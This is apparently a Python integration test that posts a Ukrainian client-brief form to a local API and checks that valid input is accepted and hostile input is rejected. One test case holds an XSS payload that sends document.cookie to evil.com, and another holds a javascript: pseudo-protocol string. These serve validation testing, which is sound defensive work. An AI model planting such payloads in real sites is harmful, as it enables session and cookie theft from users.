import urllib.request
import urllib.error
import json

BASE_URL = 'http://127.0.0.1:8000'

def send_submission(payload):
    req = urllib.request.Request(
        f'{BASE_URL}/api/brief',
        data=json.dumps(payload).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )
    try:
        res = urllib.request.urlopen(req)
        return res.status, json.loads(res.read().decode('utf-8'))
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read().decode('utf-8'))

print("--- Testing HTTP Submissions with Regex Validation ---")

# 1. Valid submission with rich Ukrainian textarea
valid_payload = {
    'client_name': 'Василь Рибалка',
    'phone': '+380501112233',
    'answers': {
        '1': 'Василь Рибалка',
        '2': '+380501112233',
        '10': "Цільова аудиторія:\n- Спортсмени з фідера;\n- Початківці в карпфішингу.",
        '11': "Flagman, Brain, Carp Pro",
        '34': "Потрібна інтеграція з Новою Поштою та CRM системною OneBox. Дякую!"
    }
}
code1, data1 = send_submission(valid_payload)
print(f"1. Valid Submission: HTTP {code1}, Status: {data1.get('status')}, Ref: {data1.get('data', {}).get('reference_code')}")
assert code1 == 201, f"Expected 201, got {code1}"

# 2. Malicious XSS <script> payload in Question #34
xss_payload = {
    'client_name': 'Hacker',
    'phone': '+380501112233',
    'answers': {
        '1': 'Hacker',
        '2': '+380501112233',
        '34': "Опис: <script>document.location='http://evil.com?c='+document.cookie</script>"
    }
}
code2, data2 = send_submission(xss_payload)
print(f"2. Malicious XSS in Q34: HTTP {code2}, Status: {data2.get('status')}, Message: {data2.get('message')}")
assert code2 == 422, f"Expected 422, got {code2}"

# 3. Malicious javascript: pseudo-protocol in Question #10
js_proto_payload = {
    'client_name': 'Attacker',
    'phone': '+380501112233',
    'answers': {
        '1': 'Attacker',
        '2': '+380501112233',
        '10': "Портрет: javascript:alert('pwned')"
    }
}
code3, data3 = send_submission(js_proto_payload)
print(f"3. Malicious javascript: in Q10: HTTP {code3}, Status: {data3.get('status')}, Message: {data3.get('message')}")
assert code3 == 422, f"Expected 422, got {code3}"

print("\nALL HTTP VALIDATION INTEGRATION CHECKS PASSED SUCCESSFULLY!")
